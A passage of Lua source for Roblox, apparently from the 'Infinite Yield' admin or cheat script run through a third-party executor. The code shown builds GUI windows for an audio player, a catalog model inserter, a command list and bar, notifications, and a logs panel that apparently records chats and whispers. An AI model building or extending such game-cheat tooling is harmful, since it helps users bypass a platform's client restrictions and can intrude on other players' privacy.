		play.Position = UDim2.new(0,-10,0, Position + 5)
		play.Size = UDim2.new(0, 20, 0, 20)
		play.FontSize = Enum.FontSize.Size14
		play.Text = ""
		play.ZIndex = 6
		play.MouseButton1Click:Connect(function()
		playerenabled = false
		for i,v in pairs(game:GetDescendants()) do
		if v:IsA'Sound'then v:Destroy() end end
		wait(0.1)
		Notify('Playing: '..v.Name ..' ('..v.AssetId..')')
		local s = Instance.new("Sound", workspace)
		s.Name = "IYsound"
		s.Looped = true
		s.SoundId = "rbxassetid://" .. v.AssetId
  		s.Volume = 1
		s:Play()
		end)
Notify('Select an audio to play')
drag:TweenPosition(UDim2.new(0.5, -225, 0, 100), "InOut", "Quart", 0.5, true, nil)
Exit.MouseButton1Click:Connect(function()
drag:TweenPosition(UDim2.new(0.5, -225, 0, -400), "InOut", "Quart", 0.5, true, nil)
wait(0.6) Audios:Destroy() end) end end
end)

function dragmodel(model, window, frame, name)
local Dragger = Instance.new("Dragger") local dragging = false local drag = model drag.Parent = workspace local parts = {}
drag:MakeJoints() drag.Name = name
local mouse = game:GetService("Players").LocalPlayer:GetMouse()
function collectParts(object, baseParts)
if object:IsA("BasePart") then
baseParts[#baseParts+1] = object end
for index,child in pairs(object:GetChildren()) do
collectParts(child, baseParts) end end
collectParts(drag, parts)
Dragger:MouseDown(parts[1], Vector3.new(0,0,0), parts)
dragging = true
mouse.Move:connect(function()
if dragging then
Dragger:MouseMove(mouse.UnitRay)
end end)
mouse.KeyDown:connect(function(Key)
if dragging then
if Key == "r" then
Dragger:AxisRotate("Y")
elseif Key == "t" then
Dragger:AxisRotate("X")
elseif Key == "e" then
if window == true then
frame:TweenPosition(UDim2.new(0, 0, 0, 29), "InOut", "Quart", 0.5, true, nil)
end
drag:Destroy()
dragging = false
Dragger:MouseUp()
end end end)
mouse.Button1Down:connect(function()
if dragging then
if window == true then
frame:TweenPosition(UDim2.new(0, 0, 0, 29), "InOut", "Quart", 0.5, true, nil)
end
dragging = false
Dragger:MouseUp()
end end) end

addcmd('insert', 'inserts a model',{'ins'},
function(args, speaker)
	if isNumber(args[1]) then
	local window = false
	local Asset = game:GetService("MarketplaceService"):GetProductInfo(args[1])
	dragmodel(game:GetService("InsertService"):LoadLocalAsset("rbxassetid://" .. Asset.AssetId), window, nil, Asset.Name)
	Notify('Inserted ' .. Asset.Name .. '. Click: place | E: Cancel | R: Rotate | T: tilt')
	else
	local name = GLS(false, 0)
Notify('Loading list...')
local Models = Instance.new("ScreenGui")
local drag = Instance.new("Frame")
local PromptDialog = Instance.new("Frame")
local ModelContainerFrame = Instance.new("Frame")
local ModList = Instance.new("ScrollingFrame")
local shadow = Instance.new("Frame")
local Exit = Instance.new("TextButton")
local PopupText = Instance.new("TextLabel")
local Hide = Instance.new("TextButton")
Models.Name = "Models"
Models.Parent = game.CoreGui
drag.Name = "drag"
drag.Parent = Models
drag.Active = true
drag.BackgroundColor3 = Color3.new(1, 1, 1)
drag.BackgroundTransparency = 1
dragGUI(drag)
drag.Position = UDim2.new(0.5, -225, 0, -400)
drag.Size = UDim2.new(0, 438, 0, 26)
PromptDialog.Name = "PromptDialog"
PromptDialog.Parent = drag
PromptDialog.BackgroundColor3 = Color3.new(0, 0, 0)
PromptDialog.BackgroundTransparency = 1
PromptDialog.BorderSizePixel = 0
PromptDialog.Position = UDim2.new(0, 0, 0, -2)
PromptDialog.Size = UDim2.new(0, 438, 0, 300)
PromptDialog.ClipsDescendants = true
PromptDialog.ZIndex = 5
ModelContainerFrame.Name = "ContainerFrame"
ModelContainerFrame.Parent = PromptDialog
ModelContainerFrame.BackgroundColor3 = maincolor
ModelContainerFrame.BackgroundTransparency = 0.5
ModelContainerFrame.BorderColor3 = Color3.new(0, 0, 0)
ModelContainerFrame.BorderSizePixel = 0
ModelContainerFrame.Position = UDim2.new(0, 0, 0, 29)
ModelContainerFrame.Size = UDim2.new(1, 0, 0.829999983, 0)
ModelContainerFrame.ZIndex = 5
ModList.Name = "List"
ModList.Parent = ModelContainerFrame
ModList.BackgroundColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
ModList.BackgroundTransparency = 1
ModList.BorderColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
ModList.BorderSizePixel = 0
ModList.Position = UDim2.new(0, 10, 0, 9)
ModList.Size = UDim2.new(0, 428, 0, 230)
ModList.ZIndex = 5
ModList.BottomImage = "rbxasset://textures/blackBkg_square.png"
ModList.CanvasSize = UDim2.new(0, 0, 0, 10)
ModList.MidImage = "rbxasset://textures/blackBkg_square.png"
ModList.ScrollBarThickness = 8
ModList.TopImage = "rbxasset://textures/blackBkg_square.png"
shadow.Name = "shadow"
shadow.Parent = PromptDialog
shadow.BackgroundColor3 = maincolor
shadow.BackgroundTransparency = 0.30000001192093
shadow.BorderColor3 = Color3.new(0, 0, 0)
shadow.BorderSizePixel = 0
shadow.Position = UDim2.new(0, 0, 0.00999999978, 0)
shadow.Size = UDim2.new(0, 438, 0, 26)
Exit.Name = "Exit"
Exit.Parent = shadow
Exit.BackgroundColor3 = Color3.new(1, 0, 0)
Exit.BackgroundTransparency = 0.30000001192093
Exit.BorderColor3 = Color3.new(1, 0, 0)
Exit.BorderSizePixel = 0
Exit.Position = UDim2.new(0, 415, 0, 3)
Exit.Size = UDim2.new(0, 20, 0, 20)
Exit.FontSize = Enum.FontSize.Size14
Exit.Text = ""
PopupText.Name = "PopupText"
PopupText.Parent = shadow
PopupText.BackgroundTransparency = 1
PopupText.Position = UDim2.new(0, 61, 0, -4)
PopupText.Size = UDim2.new(0.760273993, -16, 1.15384614, 0)
PopupText.ZIndex = 6
PopupText.Font = Enum.Font.SourceSansBold
PopupText.FontSize = Enum.FontSize.Size32
PopupText.Text = GLS(false, 0).." [Models]"
PopupText.TextScaled = true
PopupText.TextColor3 = Color3.new(0.97, 0.97, 0.97)
PopupText.TextStrokeTransparency = 0
PopupText.TextWrapped = true
PopupText.TextYAlignment = Enum.TextYAlignment.Center
Hide.Name = "Hide"
Hide.Parent = shadow
Hide.BackgroundColor3 = Color3.new(1, 1, 1)
Hide.BackgroundTransparency = 0.30000001192093
Hide.BorderColor3 = Color3.new(1, 1, 1)
Hide.BorderSizePixel = 0
Hide.Position = UDim2.new(0.800000012, 41, 0, 3)
Hide.Size = UDim2.new(0, 20, 0, 20)
Hide.FontSize = Enum.FontSize.Size14
Hide.Text = ""
local hidden = false
Hide.MouseButton1Down:connect(function()
if hidden == false then hidden = true
ModelContainerFrame:TweenPosition(UDim2.new(0, 0, 0, -300), "InOut", "Quart", 0.5, true, nil)
else ModelContainerFrame:TweenPosition(UDim2.new(0, 0, 0, 29), "InOut", "Quart", 0.5, true, nil) hidden = false
end end)
local json = game:HttpGet("https://search.roblox.com/catalog/json?Category=Models&Keyword="..GLS(false, 0).."&ResultsPerPage=50", true)
local results = HttpService:JSONDecode(json)
if #results == 0 then
Notify('No models found :(')
Models:Destroy()
return
end
for i,v in pairs(results) do
		local YSize = 100
		local Position = ((i * YSize) - YSize)
		local newcmd = Example:Clone()
		newcmd.Parent = ModList
		newcmd.Visible = true
		newcmd.Position = UDim2.new(0,5,0, Position + 40)
		newcmd.Text = "    "..v.Name
		newcmd.TextSize = 20
		ModList.CanvasSize = UDim2.new(0,0,0, Position + 100)
		local ins = Instance.new("TextButton")
		ins.Name = "ins"
		ins.Parent = ModList
		ins.BackgroundColor3 = Color3.new(255, 255, 255)
		ins.BackgroundTransparency = 0.30000001192093
		ins.BorderColor3 = Color3.new(1, 0, 0)
		ins.BorderSizePixel = 0
		ins.Position = UDim2.new(0,-10,0, Position + 40)
		ins.Size = UDim2.new(0, 20, 0, 20)
		ins.FontSize = Enum.FontSize.Size14
		ins.Text = ""
		ins.ZIndex = 6
		local img = Instance.new("ImageLabel")
		img.Parent = ModList
		img.Position = UDim2.new(0,300,0, Position + 5)
		img.Size = UDim2.new(0,100,0,100)
		img.ZIndex = 6
		img.BackgroundColor3 = Color3.new(255, 255, 255)
		img.BackgroundTransparency = 1
		img.Image = 'https://www.roblox.com/Thumbs/Asset.ashx?width=110&height=110&assetId='..v.AssetId
		ins.MouseButton1Click:Connect(function()
		local window = true
		dragmodel(game:GetService("InsertService"):LoadLocalAsset("rbxassetid://" .. v.AssetId), window, ModelContainerFrame, v.Name)
		Notify('Inserted ' .. v.Name .. '. Click: place | E: Cancel | R: Rotate | T: tilt')
		ModelContainerFrame:TweenPosition(UDim2.new(0, 0, 0, -300), "InOut", "Quart", 0.5, true, nil)
		end)
Notify('Select a model to insert')
drag:TweenPosition(UDim2.new(0.5, -225, 0, 100), "InOut", "Quart", 0.5, true, nil)
Exit.MouseButton1Click:Connect(function()
drag:TweenPosition(UDim2.new(0.5, -225, 0, -400), "InOut", "Quart", 0.5, true, nil)
wait(0.6) Models:Destroy() end) end end
end)

addcmd('cmds','opens cmds window',{'commands'},
function(args, speaker)
if speaker.userId ~= LP.userId then
for _, child in pairs( workspace:GetChildren()) do
    if child.Name == speaker.Name .. "TAB" then
        child:Destroy() end end
game:GetService('Chat'):Chat(speaker.Character, 'The command to close is "'.. cmdprefix .. 'dismiss"', 1)
local GUI = Instance.new("SurfaceGui")
local holder = Instance.new("Frame")
local bar = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local MAIN = Instance.new("Frame")
local Example = Instance.new("TextLabel")
local CMDs = Instance.new("ScrollingFrame")
local PART = Instance.new("Part")
PART.Name = speaker.Name .. 'TAB'
PART.Color = maincolor
PART.Size = Vector3.new(7, 7.8, 0.2)
PART.Transparency = 0
PART.Locked = true
PART.CanCollide = false
PART.Parent = workspace
PART.Anchored = true
PART.Material = "Neon"
local GUI = Instance.new("SurfaceGui")
local holder = Instance.new("Frame")
local bar = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local MAIN = Instance.new("Frame")
local Example = Instance.new("TextLabel")
local CMDs = Instance.new("ScrollingFrame")
GUI.Name = "GUI"
GUI.Parent = PART
GUI.CanvasSize = Vector2.new(500, 600)
GUI.Face = Enum.NormalId.Back
holder.Name = "holder"
holder.Parent = GUI
holder.BackgroundColor3 = Color3.new(1, 1, 1)
holder.BackgroundTransparency = 1
holder.BorderSizePixel = 2
holder.Position = UDim2.new(0, 0, 0, 10)
holder.Size = UDim2.new(0, 300, 0, 330)
holder.ZIndex = 2
bar.Name = "bar"
bar.Parent = holder
bar.BackgroundColor3 = Color3.new(0, 0, 0)
bar.BackgroundTransparency = 0.89999997615814
bar.BorderSizePixel = 0
bar.Position = UDim2.new(0, 10, 1, -330)
bar.Size = UDim2.new(0, 480, 0, 33)
Title.Name = "Title"
Title.Parent = bar
Title.BackgroundColor3 = Color3.new(0.639216, 0.635294, 0.647059)
Title.BackgroundTransparency = 1
Title.Size = UDim2.new(1, 0, 0, 30)
Title.Font = Enum.Font.SourceSansBold
Title.FontSize = Enum.FontSize.Size24
Title.Text = "[Infinite Yield] Command List"
Title.TextColor3 = Color3.new(0.980392, 0.980392, 0.980392)
MAIN.Name = "MAIN"
MAIN.Parent = holder
MAIN.BackgroundColor3 = Color3.new(0, 0, 0)
MAIN.BackgroundTransparency = 0.89999997615814
MAIN.BorderSizePixel = 0
MAIN.Position = UDim2.new(0, 10, 1, -300)
MAIN.Size = UDim2.new(0, 480, 0, 550)
Example.Name = "Example"
Example.Parent = MAIN
Example.BackgroundColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
Example.BackgroundTransparency = 1
Example.BorderColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
Example.BorderSizePixel = 0
Example.Size = UDim2.new(0, 190, 0, 40)
Example.Visible = false
Example.Font = Enum.Font.SourceSansBold
Example.FontSize = Enum.FontSize.Size36
Example.Text = "txt"
Example.TextColor3 = Color3.new(0.972549, 0.972549, 0.972549)
Example.TextStrokeTransparency = 0
Example.TextXAlignment = Enum.TextXAlignment.Left
Example.ZIndex = 6
CMDs.Name = "CMDs"
CMDs.Parent = MAIN
CMDs.BackgroundColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
CMDs.BackgroundTransparency = 1
CMDs.BorderColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
CMDs.BorderSizePixel = 0
CMDs.Size = UDim2.new(0, 480, 0, 550)
CMDs.BottomImage = "rbxasset://textures/blackBkg_square.png"
CMDs.CanvasSize = UDim2.new(0, 0, 0, 4880)
CMDs.MidImage = "rbxasset://textures/blackBkg_square.png"
CMDs.ScrollBarThickness = 15
CMDs.TopImage = "rbxasset://textures/blackBkg_square.png"
	local CMDsV = CMDsFolder:GetChildren()
	for i = 1, #CMDsV do
		local YSize = 35
		local Position = ((i * YSize) - YSize)
		local newcmd = Example:Clone()
		newcmd.Parent = CMDs
		newcmd.Visible = true
		newcmd.Position = UDim2.new(0,10,0, Position + 1)
		newcmd.Text = "" .. CMDsV[i].Value
	CMDs.CanvasSize = UDim2.new(0,0,0, Position + 40) end
local cf = speaker.Character.HumanoidRootPart.CFrame
local newcf = cf + cf.lookVector * 6 + Vector3.new(0, 1, 0)
PART.CFrame = newcf
speaker.Character.Humanoid.Died:connect(function()
PART:Destroy() end)
wait(1)
PART.Transparency = 0.1 wait(0.05) PART.Transparency = 0.2 wait(0.05)
PART.Transparency = 0.3 wait(0.05) PART.Transparency = 0.4 wait(0.05)
PART.Transparency = 0.5 wait(0.05) PART.Transparency = 0.6 wait(0.05)
if FindTable(hastab, speaker.Name) then movetab(speaker,PART) return end
table.insert(hastab, speaker.Name) movetab(speaker,PART)
else
if cmdOpen == true then
game.CoreGui.cp.Frame.holder.FeedbackMain:TweenPosition(UDim2.new(1.02,0,1.018,-310),"Out","Quad",0.2,true) wait(0.1)
game.CoreGui.cp.Frame.holder.size:TweenPosition(UDim2.new(1,-301,1,-300),"Out","Quad",0.2,true) wait(0.2)
game.CoreGui.cp.Frame.holder.bar.Hide.Visible = true
game.CoreGui.cp.Frame.holder.bar.Hide:TweenSize(UDim2.new(0,20,0,20),"Out","Quad",0.2,true)
else
commands() searchbar()
end end
end)
cmdBAR.FocusLost:connect(function(enterpressed)
	if enterpressed and cmdBAR.Text ~= "" then
		spawn(function ()
			execCmd(cmdBAR.Text, Player)
		end)
	end
	game.CoreGui.sugg.suggestions:TweenSize(UDim2.new(0, 300, 0, 0),"Out","Quad",0.2,true)
	cmdBAR.BorderSizePixel = 1
	wait(0.1)
	cmdBAR.BorderSizePixel = 0
	cmdBAR.Text = 'Press ' ..cmdbarbind.. ' to focus the cmd bar'
end)
Mouse.KeyDown:connect(function(Key)
	if (Key==cmdbarbind) then
		cmdBAR:CaptureFocus()
		cmdBAR.BorderSizePixel = 1
		wait(0.1)
		cmdBAR.BorderSizePixel = 2
	end
end)
cmdBAR.Changed:connect(function (property)
if suggestionstoggle == true and cmdBAR:IsFocused() then IndexContents2(cmdBAR.Text,true) end
end)
cmdBAR:GetPropertyChangedSignal("Text"):Connect(function()
    local diff = cmdBAR.TextBounds.X-250
    cmdBAR:TweenSizeAndPosition(UDim2.new(0,250+math.floor(math.max(0,diff)),0,25),UDim2.new(0,10-math.floor(math.max(0,diff)),1,-35),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)
end)
cmdBAR.Focused:Connect(function() historyCount = 0 end)
game:GetService("UserInputService").InputBegan:Connect(function(input)
    if not cmdBAR:IsFocused() then return end
    if input.KeyCode == Enum.KeyCode.Up then
        historyCount = historyCount + 1
        if historyCount > #cmdHistory then historyCount = #cmdHistory end
        cmdBAR.Text = cmdHistory[historyCount] or ""
    elseif input.KeyCode == Enum.KeyCode.Down then
        historyCount = historyCount - 1
        if historyCount < 1 then historyCount = 1 end
        cmdBAR.Text = cmdHistory[historyCount] or ""
    end
end)
NOTIFY = DATA.Notification
NOTIFY.Parent = game.CoreGui
local usingNOTE = false
function Notify(msg)
	spawn(function()
		if NOTIFY.NOTIFY and NOTIFY.NOTIFY.NOTE then
				NOTIFY.NOTIFY:TweenPosition(UDim2.new(0,0,0,-100), "InOut", "Quart", 0.5, true, nil)
				wait(0.5)
				MusicPlayer:Hide()
				if qopen == true then
				quickmenu.sheild.cmds:TweenPosition(UDim2.new(0, 50, 0, -50), "InOut", "Quart", 0.5, true, nil) wait(0.01)
				quickmenu.sheild.settings:TweenPosition(UDim2.new(0, 146, 0, -50), "InOut", "Quart", 0.5, true, nil) wait(0.01)
				quickmenu.sheild.updates:TweenPosition(UDim2.new(0, 220, 0, -50), "InOut", "Quart", 0.5, true, nil) wait(0.01)
				quickmenu.sheild.info:TweenPosition(UDim2.new(0, 290, 0, -50), "InOut", "Quart", 0.5, true, nil) wait(0.01)
				quickmenu.sheild.mix:TweenPosition(UDim2.new(0, 340, 0, -50), "InOut", "Quart", 0.5, true, nil) wait(0.01) qopen = false
				NOTIFY.NOTIFY.NOTE.Text = msg
				NOTIFY.NOTIFY:TweenPosition(UDim2.new(0, 0, 0, -38), "InOut", "Quart", 0.5, true, nil)
				if playerenabled == true then
				wait(4)
				if playerenabled == true then
				MusicPlayer:Show()
				NOTIFY.NOTIFY:TweenPosition(UDim2.new(0,0,0,-100), "InOut", "Quart", 0.5, true, nil)
				end
				end
				else
				NOTIFY.NOTIFY.NOTE.Text = msg
				NOTIFY.NOTIFY:TweenPosition(UDim2.new(0, 0, 0, -38), "InOut", "Quart", 0.5, true, nil)
				if playerenabled == true then
				wait(4)
				if playerenabled == true then
				MusicPlayer:Show()
				NOTIFY.NOTIFY:TweenPosition(UDim2.new(0,0,0,-100), "InOut", "Quart", 0.5, true, nil)
				end
				end
end end end) end
local loadbar = Instance.new("ScreenGui") local Loading = Instance.new("TextLabel") local fr = Instance.new("Frame") local ba = Instance.new("Frame") loadbar.Name = "loadbar" loadbar.Parent = game.CoreGui
Loading.Name = "Loading" Loading.Parent = loadbar Loading.BackgroundColor3 = Color3.new(1, 1, 1) Loading.BackgroundTransparency = 1 Loading.Position = UDim2.new(0.25, 0, 0.875, 0) Loading.Size = UDim2.new(0.5, 0, 0, 50)
Loading.ZIndex = 101 Loading.Font = Enum.Font.ArialBold Loading.FontSize = Enum.FontSize.Size24 Loading.Text = "Loading..." Loading.TextColor3 = Color3.new(0, 0, 0) Loading.TextStrokeColor3 = Color3.new(1, 1, 1) Loading.TextStrokeTransparency = 0.5
Loading.TextTransparency = 0.10000000149012 Loading.TextWrapped = true fr.Name = "fr" fr.Parent = Loading fr.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078) fr.BackgroundTransparency = 0.30000001192093
fr.BorderColor3 = Color3.new(0.196078, 0.196078, 0.196078) fr.BorderSizePixel = 2 fr.Size = UDim2.new(1, 0, 1, 0) ba.ZIndex = 100 fr.ZIndex = 99 ba.Name = "ba" ba.Parent = Loading ba.BackgroundColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392) ba.BorderColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
ba.BorderSizePixel = 0 ba.Size = UDim2.new(0, 0, 1, 0)
if aliasSave then
for i = 1, #aliasSave do
execCmd("877241loadalias "..aliasSave[i].CMD.." "..aliasSave[i].ALIAS)
end else
aliasSave = {} wait(0.1) updatefile()
for i = 1, #aliasSave do
execCmd("877241loadalias "..aliasSave[i].CMD.." "..aliasSave[i].ALIAS)
end end
Loading.ba:TweenSize(UDim2.new(0.3, 0, 1, 0), "InOut", "Quart", 1, true, nil)
commands() wait(0.01) game.CoreGui.cp:Destroy() cmdOpen = false
local Logs = Instance.new("ScreenGui")
logdrag = Instance.new("Frame")
local PromptDialog = Instance.new("Frame")
local ContainerFrame = Instance.new("Frame")
local pos = Instance.new("Frame")
local clear = Instance.new("TextButton")
local scroll = Instance.new("ScrollingFrame")
local hl = Instance.new("Frame")
local whispers = Instance.new("Frame")
local CheckBox = Instance.new("ImageButton")
local box = Instance.new("TextButton")
local whispers_2 = Instance.new("TextLabel")
local chats = Instance.new("Frame")
local CheckBox_2 = Instance.new("ImageButton")
local box_2 = Instance.new("TextButton")
local chats_2 = Instance.new("TextLabel")
local commands = Instance.new("Frame")
local CheckBox_3 = Instance.new("ImageButton")
local box_3 = Instance.new("TextButton")
local commands_2 = Instance.new("TextLabel")
local shadow = Instance.new("Frame")
local Exit = Instance.new("TextButton")
local PopupText = Instance.new("TextLabel")
local Hide = Instance.new("TextButton")
Logs.Name = "Logs"
Logs.Parent = game.CoreGui
logdrag.Name = "drag"
logdrag.Parent = Logs
logdrag.Active = true
logdrag.BackgroundColor3 = Color3.new(1, 1, 1)
logdrag.BackgroundTransparency = 1
dragGUI(logdrag)
logdrag.Position = UDim2.new(0.5, -225, 0, -400)
logdrag.Size = UDim2.new(0, 438, 0, 26)
PromptDialog.Name = "PromptDialog"
PromptDialog.Parent = logdrag
PromptDialog.BackgroundColor3 = Color3.new(0, 0, 0)
PromptDialog.BackgroundTransparency = 1
PromptDialog.BorderSizePixel = 0
PromptDialog.Position = UDim2.new(0, 0, 0, -2)
PromptDialog.Size = UDim2.new(0, 438, 0, 300)
PromptDialog.ZIndex = 5
PromptDialog.ClipsDescendants = true
ContainerFrame.Name = "ContainerFrame"
ContainerFrame.Parent = PromptDialog
ContainerFrame.BackgroundColor3 = maincolor
ContainerFrame.BackgroundTransparency = 0.5
ContainerFrame.BorderColor3 = Color3.new(0, 0, 0)
ContainerFrame.BorderSizePixel = 0
ContainerFrame.Position = UDim2.new(0, 0, 0, 29)
ContainerFrame.Size = UDim2.new(1, 0, 0.829999983, 0)
ContainerFrame.ZIndex = 5
pos.Name = "pos"
pos.Parent = ContainerFrame
pos.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
pos.BackgroundTransparency = 1
pos.BorderColor3 = Color3.new(0, 0, 0)
pos.BorderSizePixel = 0
pos.Position = UDim2.new(0, 10, 0, 9)
pos.Size = UDim2.new(0, 428, 0, 230)
pos.ZIndex = 5
clear.Name = "clear"
clear.Parent = pos
clear.BackgroundColor3 = Color3.new(0, 0, 0)
clear.BackgroundTransparency = 0.80000001192093
clear.BorderColor3 = Color3.new(1, 1, 1)
clear.Position = UDim2.new(0, 3, 0, 3)
clear.Size = UDim2.new(0, 70, 0, 20)
clear.ZIndex = 5
clear.Font = Enum.Font.SourceSans
clear.FontSize = Enum.FontSize.Size14
clear.Text = "Clear"
clear.TextColor3 = Color3.new(1, 1, 1)
scroll.Name = "scroll"
scroll.Parent = pos
scroll.BackgroundColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
scroll.BackgroundTransparency = 1
scroll.BorderColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
scroll.BorderSizePixel = 0
scroll.Size = UDim2.new(0, 413, 0, 193)
scroll.Position = UDim2.new(0.007, 0, 0.152, 0)
scroll.ZIndex = 5
scroll.BottomImage = "rbxasset://textures/blackBkg_square.png"
scroll.CanvasSize = UDim2.new(0, 0, 0, 10)
scroll.MidImage = "rbxasset://textures/blackBkg_square.png"
scroll.ScrollBarThickness = 8
scroll.TopImage = "rbxasset://textures/blackBkg_square.png"
hl.Name = "hl"
hl.Parent = pos
hl.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
hl.BackgroundTransparency = 0.5
hl.BorderColor3 = Color3.new(0, 0, 0)
hl.BorderSizePixel = 0
hl.Position = UDim2.new(0, 2, 0, 35)
hl.Size = UDim2.new(0.799065411, 72, 0.839130461, 0)
hl.ZIndex = 5
whispers.Name = "whispers"
whispers.Parent = pos
whispers.BackgroundColor3 = Color3.new(1, 1, 1)
whispers.BackgroundTransparency = 1
whispers.Size = UDim2.new(0, 428, 0, 230)
CheckBox.Name = "CheckBox"
CheckBox.Parent = whispers
CheckBox.BackgroundTransparency = 1
CheckBox.Position = UDim2.new(0.574635506, 0, 0, 2)
CheckBox.Size = UDim2.new(0, 20, 0, 20)
CheckBox.ZIndex = 6
CheckBox.Image = "http://www.roblox.com/asset/?id=65492641"
box.Name = "box"
box.Parent = whispers
box.BackgroundColor3 = Color3.new(0, 0, 0)
box.BackgroundTransparency = 0.80000001192093
box.BorderColor3 = Color3.new(1, 1, 1)
box.Position = UDim2.new(0, 172, 0, 3)
box.Size = UDim2.new(0, 94, 0, 20)
box.ZIndex = 5
box.Font = Enum.Font.SourceSans
box.FontSize = Enum.FontSize.Size14
box.Text = ""
box.TextColor3 = Color3.new(1, 1, 1)
whispers_2.Name = "whispers"
whispers_2.Parent = whispers
whispers_2.BackgroundColor3 = Color3.new(1, 1, 1)
whispers_2.BackgroundTransparency = 1
whispers_2.Position = UDim2.new(0, 172, 0, 3)
whispers_2.Size = UDim2.new(0.126168221, 20, -0.0434782617, 30)
whispers_2.ZIndex = 6
whispers_2.Font = Enum.Font.SourceSansBold
whispers_2.FontSize = Enum.FontSize.Size14
whispers_2.Text = "Whispers"
whispers_2.TextColor3 = Color3.new(0.980392, 0.980392, 0.980392)
chats.Name = "chats"
chats.Parent = pos
chats.BackgroundColor3 = Color3.new(1, 1, 1)
chats.BackgroundTransparency = 1
chats.Size = UDim2.new(0, 428, 0, 230)
CheckBox_2.Name = "CheckBox"
CheckBox_2.Parent = chats
CheckBox_2.BackgroundTransparency = 1
CheckBox_2.Position = UDim2.new(0.324635506, 0, 3.49245965e-08, 2)
CheckBox_2.Size = UDim2.new(0, 20, 0, 20)
CheckBox_2.ZIndex = 6
CheckBox_2.Image = "http://www.roblox.com/asset/?id=65492641"
box_2.Name = "box"
box_2.Parent = chats
box_2.BackgroundColor3 = Color3.new(0, 0, 0)
box_2.BackgroundTransparency = 0.80000001192093
box_2.BorderColor3 = Color3.new(1, 1, 1)
box_2.Position = UDim2.new(0, 86, 0, 3)
box_2.Size = UDim2.new(0, 73, 0, 20)
box_2.ZIndex = 5
box_2.Font = Enum.Font.SourceSans
box_2.FontSize = Enum.FontSize.Size14
box_2.Text = ""
box_2.TextColor3 = Color3.new(1, 1, 1)
chats_2.Name = "chats"
chats_2.Parent = chats
chats_2.BackgroundColor3 = Color3.new(1, 1, 1)
chats_2.BackgroundTransparency = 1
chats_2.Position = UDim2.new(0, 86, 0, 2)
chats_2.Size = UDim2.new(0.0771028027, 20, -0.0434782617, 30)
chats_2.ZIndex = 6
chats_2.Font = Enum.Font.SourceSansBold
chats_2.FontSize = Enum.FontSize.Size14
chats_2.Text = "Chats"
chats_2.TextColor3 = Color3.new(0.980392, 0.980392, 0.980392)
commands.Name = "commands"
commands.Parent = pos
commands.BackgroundColor3 = Color3.new(1, 1, 1)
commands.BackgroundTransparency = 1
commands.Size = UDim2.new(0, 428, 0, 230)
CheckBox_3.Name = "CheckBox"
CheckBox_3.Parent = commands
CheckBox_3.BackgroundTransparency = 1
CheckBox_3.Position = UDim2.new(0.844495356, 0, 0, 2)
CheckBox_3.Size = UDim2.new(0, 20, 0, 20)
CheckBox_3.ZIndex = 6
CheckBox_3.Image = "http://www.roblox.com/asset/?id=65492641"
box_3.Name = "box"
box_3.Parent = commands
box_3.BackgroundColor3 = Color3.new(0, 0, 0)
box_3.BackgroundTransparency = 0.80000001192093
box_3.BorderColor3 = Color3.new(1, 1, 1)
box_3.Position = UDim2.new(0, 279, 0, 3)
box_3.Size = UDim2.new(0, 102, 0, 20)
box_3.ZIndex = 5
box_3.Font = Enum.Font.SourceSans
box_3.FontSize = Enum.FontSize.Size14
box_3.Text = ""
box_3.TextColor3 = Color3.new(1, 1, 1)
commands_2.Name = "commands"
commands_2.Parent = commands
commands_2.BackgroundColor3 = Color3.new(1, 1, 1)
commands_2.BackgroundTransparency = 1
commands_2.Position = UDim2.new(0, 279, 0, 3)
commands_2.Size = UDim2.new(0.144859806, 20, -0.0434782617, 30)
commands_2.ZIndex = 6
commands_2.Font = Enum.Font.SourceSansBold
commands_2.FontSize = Enum.FontSize.Size14
commands_2.Text = "Commands"
commands_2.TextColor3 = Color3.new(0.980392, 0.980392, 0.980392)
shadow.Name = "shadow"
shadow.Parent = PromptDialog
shadow.BackgroundColor3 = maincolor
shadow.BackgroundTransparency = 0.30000001192093
shadow.BorderColor3 = Color3.new(0, 0, 0)
shadow.BorderSizePixel = 0
shadow.Position = UDim2.new(0, 0, 0.00999999978, 0)
shadow.Size = UDim2.new(0, 438, 0, 26)
Exit.Name = "Exit"
Exit.Parent = shadow
Exit.BackgroundColor3 = Color3.new(1, 0, 0)
Exit.BackgroundTransparency = 0.30000001192093
Exit.BorderColor3 = Color3.new(1, 0, 0)
Exit.BorderSizePixel = 0
Exit.Position = UDim2.new(0, 415, 0, 3)
Exit.Size = UDim2.new(0, 20, 0, 20)
Exit.FontSize = Enum.FontSize.Size14
Exit.Text = ""
PopupText.Name = "PopupText"
PopupText.Parent = shadow
PopupText.BackgroundTransparency = 1
PopupText.Position = UDim2.new(0, 61, 0, -5)
PopupText.Size = UDim2.new(0.760273993, -16, 1.15384614, 0)
PopupText.ZIndex = 6
PopupText.Font = Enum.Font.SourceSansBold
PopupText.TextSize = 31
PopupText.Text = "Logs"
PopupText.TextColor3 = Color3.new(0.97, 0.97, 0.97)
PopupText.TextStrokeTransparency = 0
PopupText.TextWrapped = true
PopupText.TextYAlignment = Enum.TextYAlignment.Top
Hide.Name = "Hide"
Hide.Parent = shadow
Hide.BackgroundColor3 = Color3.new(1, 1, 1)
Hide.BackgroundTransparency = 0.30000001192093
Hide.BorderColor3 = Color3.new(1, 1, 1)
Hide.BorderSizePixel = 0
Hide.Position = UDim2.new(0.800000012, 41, 0, 3)
Hide.Size = UDim2.new(0, 20, 0, 20)
Hide.FontSize = Enum.FontSize.Size14
Hide.Text = ""
checked = "http://www.roblox.com/asset/?id=65492641"
unchecked = "http://www.roblox.com/asset/?id=65492651"
if chatsV == true then
CheckBox_2.Image = checked else
CheckBox_2.Image = unchecked end
box_2.MouseButton1Down:connect(function()
if chatsV == true then chatsV = false
CheckBox_2.Image = unchecked updatefile() else
